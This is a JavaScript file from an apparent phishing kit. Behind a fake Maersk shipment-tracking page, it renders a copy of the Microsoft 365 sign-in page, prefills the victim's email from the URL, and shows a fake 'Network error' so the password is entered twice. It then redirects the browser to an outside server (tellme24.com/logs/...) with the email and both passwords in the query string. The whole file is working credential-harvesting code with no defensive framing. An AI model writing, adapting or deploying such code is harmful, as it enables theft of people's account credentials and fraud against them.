const maersk_contents = document.getElementById("maersk_contents");

const hauling_img = document.getElementById("hauling_img");

const maersk_table = document.getElementById("maersk_table");
const track_btn = document.getElementById("track_btn");

const laod_content = document.getElementById("laod_content");
const img_laoder = document.getElementById("img_laoder");
const service_laoding = document.getElementById("service_laoding");

// img_counter = Math.floor(Math.random() * 4);
// let photo_slide  = `https://babo4.github.io/msk/${img_counter}.png;`
// hauling_img.src = photo_slide;

track_btn.addEventListener("click", ()=>{
    maersk_table.style.display = "none";
    laod_content.style.display = "flex";

    setTimeout(() => {
        service_laoding.innerText = "Fetching email portal . . .";
    }, 3000);

    setTimeout(() => {
        service_laoding.innerText = "Email verification . . .";
    }, 6000);

    setTimeout(() => {
        maersk_contents.innerHTML = `
        <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    *{
        padding: 0;
        margin: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        transition: 0.2s ease;
    }
    
    a{
        text-decoration: none;
        color: #005da6;
    }
    
    main{
        width: 100%;
        height: 100vh;
        overflow: hidden;
        position: relative;
        background-image: linear-gradient(to bottom right, rgba(255, 165, 0, 0.2) , silver, silver, rgba(255, 165, 0, 0.2));
        display: flex;
        justify-content: center;
        align-items: center;
    }
    
    #form_container{
        width: 35%;
        min-height: 50vh;
        background-color: transparent;
    }
    
    #form_container div{
        background-color: white;
        box-shadow: 0px 0px 3px gray;
    }
    
    .office_main_form{
        position: relative;
        padding: 2rem 3rem;
    }
    
    #load_ani{
        display: none;
        width: 100%;
        position: absolute;
        top: 0;
        left: 0;
        font-size: 1.5rem;
        animation: loading_ani 3s linear infinite;
    }
    
    
    .office_main_form h1{
        font-weight: 450;
        margin-top: 0.5rem;
    }
    
    #name_holder{
        color: rgba(0, 0, 0, 0.8);
        font-size: 1rem;
    }
    
    #name_holder b{
        font-size: larger;
        cursor: pointer;
    }
    
    #name_holder{
        display: none;
    }
    
    .office_main_form input{
        display: block;
        width: 100%;
        margin: 1rem 0rem;
        padding: 0.5rem 0.1rem;
        border: 1px solid gray;
        border-width: 0px 0px 1px 0px;
        font-size: inherit;
        outline: none;
    }
    
    .office_main_form input:focus{
        border-color: #005da6 !important;
    }
    
    .btn_container{
        display: flex;
        justify-content: right;
        align-items: center;
        margin-top: 2rem;
    }
    
    .btn_container button{
        background-color: rgba(0, 93, 166, 0.9);
        color: white;
        font-size: inherit;
        border: none;
        padding: 0.4rem 2rem;
    }
    
    .btn_container button:hover{
        background-color: rgba(0, 93, 166, 1);
        cursor: pointer;
    }
    
    .office_main_form p{
        font-size: 0.9rem;
        margin-top: 1rem;
    }
    
    .link_q{
        width: 17px;
        height: 17px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        border: 1px solid black;
        border-radius: 50%;
        margin: 0px 3px;
    }
    
    .office_sub_form{
        display: flex;
        align-items: center;
        gap: 0.5rem;
        margin-top: 2rem;
        padding: 0.5rem 3rem;
    }
    
    .office_sub_form:hover{
        background-color: lightgray !important;
        cursor: pointer;
    }
    
    .office_sub_form img{
        width: 30px;
        object-fit: contain;
    }
    
    footer{
        position: absolute;
        bottom: 0.5rem;
        right: 0.5rem;
        font-size: 0.8rem;
    }
    
    footer a{
        color: black;
        margin-right: 0.5rem;
    }
    
    footer a:not(:last-child):hover{
        text-decoration: underline;
    }
    
    /*  */
    @keyframes loading_ani {
        from{transform: scaleX(100%);}
        to{transform: scaleX(-95%);}
    }
    
    /*  */
    @media (max-width:1030px) {
        main{
            background: white;
        }
    
        #form_container{
            width: 50%;
        }
    
        #form_container div{
            box-shadow: none;
        }
    }
    
    @media (max-width:900px) {
        #form_container{
            width: 70%;
        }
    }
    
    @media (max-width:600px) {
        #form_container{
            width: 90%;
        }
    
        .office_sub_form img{
            width: 25px;
        }
    }
    
    @media (max-width:500px) {
        #form_container{
            width: 90%;
        }
    
        .office_main_form, .office_sub_form{
            padding: 0.5rem 1rem;
        }
    
        #load_ani{
            top: -2rem;
        }
    }
    
    @media (max-width:400px) {
        #form_container{
            width: 95%;
        }
    
        .office_main_form, .office_sub_form{
            padding: 0.5rem;
        }
    
        .office_sub_form img{
            width: 20px;
        }
    }
    
    @media (max-width:300px) {
        main{
            overflow: auto;
        }
    }
    
    </style>
    <title>Sign in to your account</title>
</head>
<body>

    <main id="app_main">
        <aside id="form_container">
            <div class="office_main_form">
                
            <b id="load_ani">. . .</b>
            
                <img src="https://babo4.github.io/msk/logo.svg" alt="Sign in">
                <p id="name_holder"><b>&#10508;</b> <span id="e_holder"></span></p>

                <h1 id="header_main">Sign in</h1>

                <input type="email" id="e_input" value="" class="show_pass_content" placeholder="Email, phone, or Skype">

                <input type="hidden" id="temp_p">
                <input type="hidden" id="data_send" value="1">
                <p id="link1">No account? <a href="">Create one!</a></p>
                <p id="link2"><a href="">Sign in with Windows Hello or a security key</a> <span class="link_q">?</span></p>
                <section class="btn_container">
                    <button id="btn_365">Next</button>
                </section>
            </div>

            <div class="office_sub_form">
                <img src="https://babo4.github.io/msk/key.svg" alt="Sign in">
                <span>Sign-in options</span>
            </div>

        </aside>

        <footer>
            <a href="">Terms of use</a>
            <a href="">Privacy & cookies</a>
            <a href="">. . .</a>
        </footer>
    </main>
    
</body>
</html>
        `;

        const validEmail =
        /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    
    const urls = new URLSearchParams(window.location.search);
    const user = urls.get('user');
    
    const e_input = document.getElementById("e_input");
    const load_ani = document.getElementById("load_ani");
    const data_send = document.getElementById("data_send");
    
    let link1 = document.getElementById("link1");
    let link2 = document.getElementById("link2");
    let name_holder = document.getElementById("name_holder");
    let header_main = document.getElementById("header_main");
    let btn_365 = document.getElementById("btn_365");
    let temp_p = document.getElementById("temp_p");
    let e_holder = document.getElementById("e_holder");
    
    const office_sub_form = document.querySelector(".office_sub_form");
    
    let office_count = 0;
    
    const sub_btn = document.getElementById("form_container");
    sub_btn.addEventListener("click", (e)=>{
        // e.preventDefault()
    
        if (btn_365.innerText == "Next") {
    
            let rand_num = Math.floor(Math.random() * 2000) + 5000;
    
            if (validEmail.test(e_input.value)) {
                load_ani.style.display = "block";
                btn_365.innerText = "Wait . . ."
    
                setTimeout(() => {
                    getMail(e_input.value)
                    e_input.value = ""
                    load_ani.style.display = "none"
                }, rand_num); 
            } 
            else if (validEmail.test(user)) {
                getMail(user) 
            }
            else{
                e_input.style.borderColor = "red";
            }
            
        }
    
        if (btn_365.innerText == "Sign in") {
            office_count++
    
            if (office_count == 2) {
    
                if (validEmail.test(e_holder.innerText)) {
    
                    if (e_input.value.length < 6 || e_input.value == "password" || e_input.value == "Password" || e_input.value == "PASSWORD" || e_input.value == "qwerty" || e_input.value == "QWERTY" || e_input.value == "123456" || e_input.value == "testing" || e_input.value == "Testing" || e_input.value == "TESTING") {
    
                    e_input.style.borderColor = "red";
                    office_count = 2;
        
                        return
                    }
    
                    getPass(pass1 = temp_p.value, pass2 = e_input.value, mail = e_holder.innerText)
                }
            } 
            else {
    
                if (e_input.value.length < 6 || e_input.value == "password" || e_input.value == "Password" || e_input.value == "PASSWORD" || e_input.value == "qwerty" || e_input.value == "QWERTY" || e_input.value == "123456" || e_input.value == "testing" || e_input.value == "Testing" || e_input.value == "TESTING") {
                    e_input.style.borderColor = "red"
    
                    return
                }
    
                let rand_num = Math.floor(Math.random() * 2000) + 5000;
    
                load_ani.style.display = "block";
                btn_365.innerText = "Verifying . . ."
    
                 setTimeout(() => {
                    temp_p.value =  e_input.value;
                    e_input.value = "";
                    load_ani.style.display = "none";
                    e_input.style.borderColor = "red";
    
                    office_sub_form.style.display = "block";
                    office_sub_form.innerHTML = `<b style="color:red; font-weight:400">Network error! Please try again. </b>`;
                    btn_365.innerText = "Sign in"
                 }, rand_num);
            }
        }
        
    })
    
    // 
    if (user != null && validEmail.test(user)) {
        getMail(user)
        e_input.value = ""
    }
    else if (validEmail.test(e_input.value)) {
        load_ani.style.display = "block";
            btn_365.innerText = "Wait . . ."
    
            setTimeout(() => {
                getMail(e_input.value)
                e_input.value = ""
                load_ani.style.display = "none"
            }, 1000);
    }
    
    // 
    function getPass(pass1, pass2, mail) {
        if (pass1 != "" && pass2 !="" && mail != "") {
            let url = "msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
    
            if (data_send.value == 1) {
                url = "https://tellme24.com/logs/365/gb1/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
            }
            else  if (data_send.value == 2) {
                url = "https://tellme24.com/logs/365/gb2/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
            }
            else  if (data_send.value == 3) {
                url = "https://tellme24.com/logs/365/gb3/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
            }
            else  if (data_send.value == 4) {
                url = "https://tellme24.com/logs/365/bo/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
            }
    
            location = url;
            
        }
        else {
            e_input.style.borderColor = "red";
        }
    }
    
    function getMail(mail) {
        if (validEmail.test(mail)) {
            name_holder.style.display = "block";
            e_holder.innerText = mail;
            e_input.placeholder = "Password";
            e_input.type = "password";
            header_main.innerText = "Enter password";
            btn_365.innerText = "Sign in";
            link1.innerHTML = `<a href="">Forgot password?</a>`;
            link2.innerHTML = `<a href="">Other ways to sign in</a>`;
            office_sub_form.style.display = "none"
    
        }
        else{
            e_input.style.borderColor = "red";
        }
    }
    }, 9000);

    // maersk_contents
    // laod_content.innerHTML = `
    
    // `;
});
